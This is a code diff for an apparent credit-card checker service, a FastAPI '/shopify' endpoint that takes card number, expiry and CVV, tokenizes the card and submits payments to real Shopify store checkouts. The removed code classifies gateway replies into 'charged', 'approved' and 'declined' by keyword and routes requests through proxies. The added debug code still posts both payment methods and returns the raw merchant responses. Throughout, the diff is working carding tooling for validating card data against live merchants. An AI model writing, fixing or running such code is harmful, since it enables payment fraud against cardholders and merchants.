@@ -112,164 +112,6 @@ async def tokenize_card(session, cc_parts, proxy=None):
     return None
 
 
-async def submit_payment(session, site, checkout_token, card_token, cc_parts, price, proxy=None):
-    number, month, year, cvv = cc_parts
-    if len(year) == 2:
-        year = "20" + year
-
-    # Method 1: wallets/checkouts endpoint (JSON)
-    try:
-        payload = {
-            "payment": {
-                "payment_token": {"payment_data": card_token, "type": "shopify_token"},
-                "amount": price,
-                "unique_token": card_token[:16],
-            }
-        }
-        headers = {
-            "Content-Type": "application/json",
-            "X-Shopify-Checkout-Version": "2016-09-06",
-            "Accept": "application/json",
-        }
-        async with session.post(
-            f"{site}/wallets/checkouts/{checkout_token}/payments",
-            json=payload, proxy=proxy, timeout=TIMEOUT,
-            ssl=False, headers=headers
-        ) as r:
-            raw = await r.text()
-            if raw and raw.strip().startswith("{"):
-                return _json.loads(raw)
-    except Exception:
-        pass
-
-    # Method 2: checkout form submission
-    try:
-        form_data = {
-            "_method": "patch",
-            "authenticity_token": "",
-            "previous_step": "payment_method",
-            "step": "",
-            "s": card_token,
-            "checkout[payment_gateway]": "",
-            "checkout[credit_card][vault]": "false",
-            "checkout[different_billing_address]": "false",
-            "checkout[remember_me]": "false",
-            "complete": "1",
-        }
-        headers2 = {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Accept": "application/json",
-            "X-Requested-With": "XMLHttpRequest",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        }
-        async with session.post(
-            f"{site}/checkouts/{checkout_token}",
-            data=form_data, proxy=proxy, timeout=TIMEOUT,
-            ssl=False, headers=headers2, allow_redirects=True
-        ) as r:
-            raw = await r.text()
-            final_url = str(r.url)
-            if "thank_you" in final_url or "orders" in final_url:
-                return {"payment": {"status": "success", "message": "order_paid"}}
-            if raw and raw.strip().startswith("{"):
-                try:
-                    return _json.loads(raw)
-                except Exception:
-                    pass
-            rl = raw.lower()
-            if any(k in rl for k in ["declined", "card was declined", "not accepted"]):
-                return {"payment": {"status": "failed", "message": "card_declined"}}
-            if any(k in rl for k in ["insufficient", "do_not_honor", "cvc", "cvv"]):
-                return {"payment": {"status": "failed", "message": "insufficient_funds"}}
-            if re.search(r'expir', rl):
-                return {"payment": {"status": "failed", "message": "expired_card"}}
-            return {"payment": {"status": "unknown", "message": "unknown"}}
-    except Exception as e:
-        return {"error": str(e)}
-
-
-def parse_payment_response(data, price):
-    if not data:
-        return "Unknown Error", "Unknown"
-
-    tx = data.get("transaction") or data.get("payment") or {}
-    if not isinstance(tx, dict):
-        tx = {}
-
-    status     = str(tx.get("status",     data.get("status",     ""))).lower().strip()
-    message    = str(tx.get("message",    data.get("message",    ""))).lower().strip()
-    error_code = str(tx.get("error_code", data.get("error_code", ""))).lower().strip()
-    gateway    = tx.get("gateway", data.get("gateway", "Shopify"))
-
-    full_text = f"{status} {message} {error_code}".strip()
-
-    charged_kw = ["order_paid", "order_placed", "order_confirmed",
-                  "payment_successful", "thank_you", "paid", "completed", "success"]
-    for kw in charged_kw:
-        if kw in full_text:
-            return f"order_paid | {message or status}", gateway
-
-    if re.search(r'expir', full_text):
-        return "expired_card", gateway
-
-    approved_kw = [
-        "3d", "otp", "authentication_required", "authentication",
-        "insufficient_funds", "insufficient",
-        "do_not_honor", "velocity_exceeded", "card_velocity_exceeded",
-        "restricted_card", "security_violation",
-        "transaction_not_allowed", "not_permitted", "service_not_allowed",
-        "call_issuer", "try_again_later", "pickup_card", "pick_up_card",
-        "avs", "revocation", "stop_payment",
-        "incorrect_cvc", "incorrect cvc", "cvc", "cvv", "ccn",
-    ]
-    for kw in approved_kw:
-        if kw in full_text:
-            return message or error_code or status or kw, gateway
-
-    declined_kw = [
-        "generic_decline", "generic decline",
-        "card_declined", "card declined",
-        "declined", "decline",
-        "fraudulent", "fraud",
-        "stolen_card", "lost_card",
-        "processor_declined",
-        "card_not_supported", "currency_not_supported",
-        "decision_rule_block",
-        "blocked", "denied", "refused", "rejected",
-        "invalid_number", "incorrect_number",
-        "duplicate_transaction",
-        "payment_intent_authentication_failure",
-        "failed",
-    ]
-    for kw in declined_kw:
-        if kw in full_text:
-            return message or error_code or status or kw, gateway
-
-    err = data.get("errors", {})
-    if err:
-        return str(err)[:100], gateway
-
-    result_text = message or error_code or status
-    if result_text and result_text not in ["unknown", "none", ""]:
-        return result_text, gateway
-
-    return "Unknown", gateway
-
-
-def parse_proxy_string(proxy_str):
-    if not proxy_str:
-        return None
-    proxy_str = proxy_str.strip()
-    if proxy_str.startswith(("http://", "https://", "socks5://")):
-        return proxy_str
-    parts = proxy_str.split(":")
-    if len(parts) == 2:
-        return f"http://{parts[0]}:{parts[1]}"
-    if len(parts) == 4:
-        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-    return f"http://{proxy_str}"
-
-
 @app.get("/shopify")
 async def check_shopify(
     site: str = Query(...),
@@ -283,8 +125,10 @@ async def check_shopify(
             return JSONResponse({"Status": False, "Response": "Invalid card format", "Price": "-", "Gate": "Shopify"})
 
         number, month, year, cvv = parts
+        if len(year) == 2:
+            year = "20" + year
         site_url = normalize_url(site)
-        proxy_url = parse_proxy_string(proxy)
+        proxy_url = None
 
         connector = aiohttp.TCPConnector(ssl=False, limit=10)
         async with aiohttp.ClientSession(connector=connector) as session:
@@ -304,33 +148,62 @@ async def check_shopify(
             if not card_token:
                 return JSONResponse({"Status": False, "Response": "Failed to tokenize card", "Price": price, "Gate": "Shopify"})
 
-            result = await submit_payment(
-                session, site_url, checkout_token, card_token,
-                [number, month, year, cvv], price, proxy_url
-            )
+            # DEBUG Method 1
+            debug_info = {"checkout_token": checkout_token, "card_token_prefix": card_token[:10]}
 
-            response_text, gateway = parse_payment_response(result, price)
-            resp_lower = response_text.lower()
+            try:
+                payload = {
+                    "payment": {
+                        "payment_token": {"payment_data": card_token, "type": "shopify_token"},
+                        "amount": price,
+                        "unique_token": card_token[:16],
+                    }
+                }
+                headers = {
+                    "Content-Type": "application/json",
+                    "X-Shopify-Checkout-Version": "2016-09-06",
+                    "Accept": "application/json",
+                }
+                async with session.post(
+                    f"{site_url}/wallets/checkouts/{checkout_token}/payments",
+                    json=payload, timeout=TIMEOUT, ssl=False, headers=headers
+                ) as r:
+                    raw1 = await r.text()
+                    debug_info["method1_status"] = r.status
+                    debug_info["method1_raw"] = raw1[:300]
+                    debug_info["method1_url"] = str(r.url)
+            except Exception as e:
+                debug_info["method1_error"] = str(e)
 
-            if any(kw in resp_lower for kw in ["order_paid", "paid", "completed", "payment_successful"]):
-                final_status = True
-            elif re.search(r'expir', resp_lower):
-                final_status = "expired"
-            elif any(kw in resp_lower for kw in [
-                "declined", "decline", "fraudulent", "fraud",
-                "stolen", "blocked", "denied", "refused", "rejected",
-                "invalid_number", "generic_decline", "failed", "unknown"
-            ]):
-                final_status = False
-            else:
-                final_status = "approved"
+            # DEBUG Method 2
+            try:
+                form_data = {
+                    "_method": "patch",
+                    "authenticity_token": "",
+                    "previous_step": "payment_method",
+                    "step": "",
+                    "s": card_token,
+                    "complete": "1",
+                }
+                headers2 = {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "User-Agent": "Mozilla/5.0",
+                }
+                async with session.post(
+                    f"{site_url}/checkouts/{checkout_token}",
+                    data=form_data, timeout=TIMEOUT, ssl=False,
+                    headers=headers2, allow_redirects=True
+                ) as r:
+                    raw2 = await r.text()
+                    debug_info["method2_status"] = r.status
+                    debug_info["method2_final_url"] = str(r.url)
+                    debug_info["method2_raw"] = raw2[:500]
+            except Exception as e:
+                debug_info["method2_error"] = str(e)
 
-            return JSONResponse({
-                "Status": final_status,
-                "Response": response_text,
-                "Price": f"${price}",
-                "Gate": gateway,
-            })
+            return JSONResponse({"DEBUG": debug_info, "Price": f"${price}"})
 
     except asyncio.TimeoutError:
         return JSONResponse({"Status": False, "Response": "Timeout", "Price": "-", "Gate": "Shopify"})
